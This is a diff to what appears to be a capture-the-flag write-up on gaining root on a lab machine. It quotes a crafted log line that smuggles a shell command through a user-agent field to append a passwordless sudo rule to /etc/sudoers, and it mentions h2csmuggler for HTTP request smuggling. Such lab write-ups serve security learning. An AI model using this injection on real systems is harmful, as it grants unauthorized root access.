@@ -102,9 +102,9 @@ service LogService {
     string ReadLogFile(1: string filePath)
 }
 ```
-In margo's /tmp directory:
+In margo's /tmp directory inside a file called `malicious.log`:
 `127.0.0.1, "user-agent":"Mozilla'; echo 'margo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers;#"`
-That basically creates a malicious log file which is then executed by the Python script. The log file adds the user `margo` to the /etc/sudoers file with no password, so now `margo` can do `sudo su` without
+That is then executed by the Python script. The log file adds the user `margo` to the /etc/sudoers file with no password, so now `margo` can do `sudo su` without
 a password. Doing this switches the user to root, and then we can get the root flag.
 
 Personal note: search for tools, in this case there was a tool `h2csmuggler` that another user told me I could take advantage of instead of manually doing the HTTP smuggling in Burpsuite.
